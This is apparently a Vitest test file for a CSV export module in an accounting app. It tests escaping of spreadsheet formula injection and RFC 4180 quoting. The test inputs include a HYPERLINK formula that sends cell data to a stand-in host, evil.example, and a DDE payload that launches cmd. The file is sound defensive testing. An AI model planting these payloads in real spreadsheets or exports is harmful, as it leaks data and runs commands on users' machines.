import { describe, expect, it } from 'vitest';
import fc from 'fast-check';
import { escapeCsvCell, toCsv } from '../src/csv.js';

// ---------------------------------------------------------------------------
// The security property
// ---------------------------------------------------------------------------

describe('formula injection', () => {
  it('neutralises a formula a user can type into a contact name', () => {
    /*
     * The whole reason this module exists. `=HYPERLINK(...)` in a customer name
     * is stored faithfully, exported faithfully, and then EXECUTED by the
     * spreadsheet the accountant opens it in — with the rest of the row
     * available to it.
     */
    const cell = escapeCsvCell('=HYPERLINK("https://evil.example/"&A1,"Invoice")');
    expect(cell.startsWith(`"'=`)).toBe(true);
  });

  it('neutralises the DDE variants too', () => {
    for (const payload of [
      '@SUM(A1:A9)',
      '+1+cmd|\' /c calc\'!A0',
      '\tleading tab',
      '\rleading carriage return',
    ]) {
      expect(escapeCsvCell(payload), payload).toContain("'");
    }
  });

  it('leaves a negative amount a NUMBER, because the export exists to be summed', () => {
    /*
     * The usual advice — guard anything starting with `-` — turns every credit
     * balance in an accounting export into text. The file then opens, looks
     * right, and will not add up: a fix that breaks the thing it protects.
     */
    expect(escapeCsvCell('-1500.00')).toBe('-1500.00');
    expect(escapeCsvCell('+1500.00')).toBe('+1500.00');
    expect(escapeCsvCell('1500.0000')).toBe('1500.0000');
  });

  it('still guards a leading dash that is not a number', () => {
    expect(escapeCsvCell('-1+1')).toContain("'");
    expect(escapeCsvCell('--cmd')).toContain("'");
  });

  it('PROPERTY: no rendered cell ever begins with a character a spreadsheet executes', () => {
    fc.assert(
      fc.property(fc.string(), (value) => {
        const rendered = escapeCsvCell(value);
        // Strip the RFC 4180 quoting to see what the spreadsheet will parse.
        const content = rendered.startsWith('"')
          ? rendered.slice(1, -1).replace(/""/g, '"')
          : rendered;

        if (/^[=@\t\r]/.test(content)) {
          throw new Error(`unguarded: ${JSON.stringify(content)}`);
        }
        // `+`/`-` survive only as part of a plain number.
        if (/^[+-]/.test(content) && !/^[-+]?\d+(\.\d+)?$/.test(content)) {
          throw new Error(`unguarded sign: ${JSON.stringify(content)}`);
        }
      }),
    );
  });
});

// ---------------------------------------------------------------------------
// RFC 4180
// ---------------------------------------------------------------------------

describe('quoting', () => {
  it('quotes a cell containing the delimiter', () => {
    expect(escapeCsvCell('Lim, Wei Sheng')).toBe('"Lim, Wei Sheng"');
  });

  it('doubles an embedded quote', () => {
    expect(escapeCsvCell('He said "no"')).toBe('"He said ""no"""');
  });

  it('quotes a cell containing a newline', () => {
    expect(escapeCsvCell('line one\nline two')).toBe('"line one\nline two"');
  });

  it('leaves an ordinary cell alone', () => {
    expect(escapeCsvCell('Trade receivables')).toBe('Trade receivables');
  });
});

describe('toCsv', () => {
  it('emits CRLF rows and a UTF-8 BOM by default', () => {
    // Without the BOM, Excel on Windows reads UTF-8 as the legacy code page and
    // mangles every Malaysian name with a non-ASCII character in it.
    const csv = toCsv([
      ['Code', 'Account'],
      ['1100', 'Trade receivables'],
    ]);

    expect(csv.startsWith('﻿')).toBe(true);
    expect(csv).toBe('﻿Code,Account\r\n1100,Trade receivables\r\n');
  });

  it('omits the BOM when asked', () => {
    expect(toCsv([['a']], { bom: false })).toBe('a\r\n');
  });

  it('renders an empty report without a stray newline', () => {
    expect(toCsv([], { bom: false })).toBe('');
  });

  it('PROPERTY: every rendered row has the same number of top-level commas as cells', () => {
    fc.assert(
      fc.property(
        fc.array(fc.string(), { minLength: 1, maxLength: 6 }),
        (cells) => {
          const line = toCsv([cells], { bom: false }).slice(0, -2);

          // Count commas outside quotes — the delimiters a parser will see.
          let inQuotes = false;
          let delimiters = 0;
          for (let i = 0; i < line.length; i++) {
            const ch = line[i];
            if (ch === '"') {
              if (inQuotes && line[i + 1] === '"') i++;
              else inQuotes = !inQuotes;
            } else if (ch === ',' && !inQuotes) {
              delimiters++;
            }
          }

          expect(delimiters).toBe(cells.length - 1);
        },
      ),
    );
  });
});
